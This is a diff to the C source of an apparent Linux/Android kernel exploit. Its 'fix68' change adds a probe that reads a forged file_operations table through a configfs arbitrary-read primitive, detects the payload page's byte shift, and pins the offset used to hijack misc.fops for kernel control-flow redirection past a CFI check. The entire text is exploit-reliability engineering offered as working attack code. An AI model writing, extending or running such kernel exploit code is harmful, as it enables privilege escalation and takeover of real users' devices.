@@ -776,7 +776,17 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
      * the written fops pointer at a different slice of the payload page.
      */
     const char *fo = getenv("KS_PSELECT_FOPS_VOFF");
-    if (fo && fo[0]) {
+    if (fops_voff_detected >= 0) {
+      /* fix68: the detected payload-page view wins over the env knob --
+       * the env value is a guess, the probe read the physical slots. */
+      uintptr_t v = fake_fops + (size_t)fops_voff_detected;
+      if (is_kernel_ptr(v)) {
+        value = v;
+        fops_voff = (size_t)fops_voff_detected;
+        pr_info("pselect fops value=%016llx (fake=%016zx + voff=%d detected)\n",
+                (unsigned long long)value, fake_fops, fops_voff_detected);
+      }
+    } else if (fo && fo[0]) {
       uintptr_t voff = strtoull(fo, NULL, 0);
       uintptr_t v = fake_fops + voff;
       if (is_kernel_ptr(v)) {
@@ -1081,6 +1091,41 @@ void do_pselect_fake_lock_route(void) {
             rb1, rb2, rb3, rb4, rb5, (unsigned long long)b_misc,
             (unsigned long long)b_list, (unsigned long long)b_text,
             (unsigned long long)b_w0, (unsigned long long)b_lock);
+    /*
+     * fix68 (2026-10-25): payload page view detect.  The page content's
+     * byte shift vs the userspace buf is a per-run lottery (which skb
+     * fragment wins the freelist reuse): b082adf8 shifted right 1 byte
+     * (kernel blr read *(fake+0x71)==canonical), 24e39de8 byte-aligned
+     * (same read returned open>>8 -> misc_open SP/PC alignment panic).
+     * KS_PSELECT_FOPS_VOFF pinned voff=1 = only the shifted page survives;
+     * every aligned page dies in misc_open.  The configfs read here is an
+     * exact physical read (page=target-pos + pread pos lands on kernel VA
+     * target, no channel shift), so probe both candidate slots and pin
+     * fops_voff to the view holding the canonical open pointer: aligned
+     * page -> kernel must read *(fake+off) (voff=0); shifted page -> the
+     * kernel's *(fake+1+off) lands on buf[off] (voff=1).  This runs before
+     * the route arms (misc.fops still the real table) so a miss here can
+     * never blr garbage; on miss keep the env value and let the existing
+     * cfi garbage gate refuse the run.
+     */
+    {
+      uint64_t want = (uint64_t)text_addr(ASHMEM_OPEN);
+      uint64_t dv0 = 0, dv1 = 0;
+      ssize_t rv0 = configfs_read_once(dfd, fake_fops + FOPS_OPEN_OFF, &dv0, 8);
+      ssize_t rv1 =
+          configfs_read_once(dfd, fake_fops + FOPS_OPEN_OFF + 1, &dv1, 8);
+      int det = -1;
+      if (rv1 == 8 && dv1 == want)
+        det = 1;
+      else if (rv0 == 8 && dv0 == want)
+        det = 0;
+      pr_info("payload view detect rd0=%zd/%016llx rd1=%zd/%016llx "
+              "want=%016llx -> voff=%d\n",
+              rv0, (unsigned long long)dv0, rv1, (unsigned long long)dv1,
+              (unsigned long long)want, det);
+      if (det >= 0)
+        fops_voff_detected = det;
+    }
     close(dfd);
   }
   int route_attempt = 1;
@@ -1670,11 +1715,14 @@ int try_cfi_stage(void) {
      * canonical in the userspace buf and need no shift.
      */
     pr_info("fix52 cfi open dump base=%016zx (cfgfs)\n", base);
-    ssize_t r0 = configfs_read_once(fd, base + FOPS_LLSEEK_OFF + 1, &llseek, 8);
-    ssize_t r1 = configfs_read_once(fd, base + FOPS_IOCTL_OFF + 1, &ioctl, 8);
-    ssize_t r2 = configfs_read_once(fd, base + FOPS_OPEN_OFF + 1, &open_slot, 8);
-    ssize_t r3 =
-        configfs_read_once(fd, base + FOPS_RELEASE_OFF + 1, &release, 8);
+    ssize_t r0 =
+        configfs_read_once(fd, base + FOPS_LLSEEK_OFF + fops_voff, &llseek, 8);
+    ssize_t r1 =
+        configfs_read_once(fd, base + FOPS_IOCTL_OFF + fops_voff, &ioctl, 8);
+    ssize_t r2 =
+        configfs_read_once(fd, base + FOPS_OPEN_OFF + fops_voff, &open_slot, 8);
+    ssize_t r3 = configfs_read_once(fd, base + FOPS_RELEASE_OFF + fops_voff,
+                                    &release, 8);
     pr_info("fix52 table dump llseek=%016llx rv=%zd ioctl=%016llx rv=%zd "
             "open=%016llx rv=%zd release=%016llx rv=%zd\n",
             (unsigned long long)llseek, r0,
